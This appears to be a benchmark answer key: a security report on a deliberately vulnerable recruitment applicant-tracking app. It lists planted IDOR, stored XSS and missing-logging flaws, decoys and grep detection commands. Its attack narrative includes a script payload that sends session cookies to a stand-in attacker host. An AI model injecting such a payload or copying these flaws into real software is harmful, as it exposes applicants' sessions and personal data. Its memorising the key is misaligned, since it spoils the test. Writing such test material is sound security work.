# Security Report: app-33-recruitment-ats

## Application Information

- **App ID**: app-33
- **App Name**: Recruitment Applicant Tracking System
- **Language**: TypeScript
- **Framework**: Express
- **Source**: `apps/typescript/app-33-recruitment-ats/`

---

## Vulnerability Summary

| ID | OWASP | Category | Severity | Location | CWE |
|---|---|---|---|---|---|
| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/applications/:id` (lines 156-170) | CWE-639 |
| V2 | A03 | Injection | High | `src/index.ts` → `POST /api/positions` (lines 148-155) | CWE-79 |
| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `DELETE /api/admin/applications/:id` (lines 193-207) | CWE-778 |

### V1: IDOR on Job Applications

**OWASP Category**: A01 — Broken Access Control

**Description**: Viewing job application details by ID lacks verification of user ownership, allowing any authenticated user to retrieve another applicant's application.

**Endpoint**: `GET /api/applications/:id`

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Impact**: Medium — Any authenticated user can enumerate application IDs to view sensitive resume data, cover letters, and evaluation notes.

**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.id` against the application's applicant ID.

---

### V2: Stored XSS in Position Descriptions

**OWASP Category**: A03 — Injection

**Description**: Job position descriptions created by recruiters are stored and rendered without HTML encoding, enabling stored cross-site scripting.

**Endpoint**: `POST /api/positions`

**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Impact**: High — An attacker/insider can inject malicious JavaScript in a position description. When applicants or other recruiters view the position, the script executes in their browser.

**Detection**: Look for position description fields being stored as raw HTML and served without sanitization.

---

### V3: Missing Audit Log on Application Deletion

**OWASP Category**: A09 — Security Logging and Monitoring Failures

**Description**: Deleting job applications at the admin level produces no audit logs, leaving record destruction untracked.

**Endpoint**: `DELETE /api/admin/applications/:id`

**CWE**: CWE-778 (Insufficient Logging)

**Impact**: Low — Malicious deletion of candidate applications cannot be traced or investigated.

**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.

---

## Chained Attack Scenario

### Chain: "Stored XSS Position Hijack → IDOR Application Exfiltration"

**Impact**: `db_exfiltration`

**Overview**: A malicious insider creates a position with malicious JavaScript that steals a recruiter's session, then uses that session to exfiltrate all job applications via IDOR.

**Components**:

| Step | Issue | Severity | OWASP | CWE | Location |
|---|---|---|---|---|---|
| 1 | Stored XSS in position descriptions enables session cookie theft | Medium | A03 | CWE-79 | `POST /api/positions` |
| 2 | Application detail endpoint permits IDOR exfiltration of candidate data | Medium | A01 | CWE-639 | `GET /api/applications/:id` |

**Attack Narrative**:
1. A malicious insider creates a job position with a description containing `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
2. When a recruiter views the position listings, the XSS payload executes in their browser, exfiltrating their session cookie.
3. Using the hijacked session, the attacker queries `GET /api/applications/3` through IDOR to view candidate applications containing PII, resumes, and evaluation scores.

**Combined Impact**: Database exfiltration — An attacker can steal recruiter sessions and exfiltrate candidate application data by chaining stored XSS with IDOR.

---

## Decoys (False-Positive Candidates)

| Location | Description |
|---|---|
| `src/index.ts` | Proper user scoping in `GET /api/applications` limiting results to own applications only |
| `src/index.ts` | Proper parameterized query logic in `POST /api/applications` to submit applications safely |

---

## Detection Commands

```bash
# Find IDOR on application details
grep -n "applications.*:id\|findOne\|findById" apps/typescript/app-33-recruitment-ats/src/index.ts

# Find XSS in position creation
grep -n "description\|position\|<script\|innerHTML" apps/typescript/app-33-recruitment-ats/src/index.ts

# Find missing audit logs on deletion
grep -n "delete\|remove\|log\|audit" apps/typescript/app-33-recruitment-ats/src/index.ts
```

---

*Report generated from `.vulns` manifest for app-33-recruitment-ats*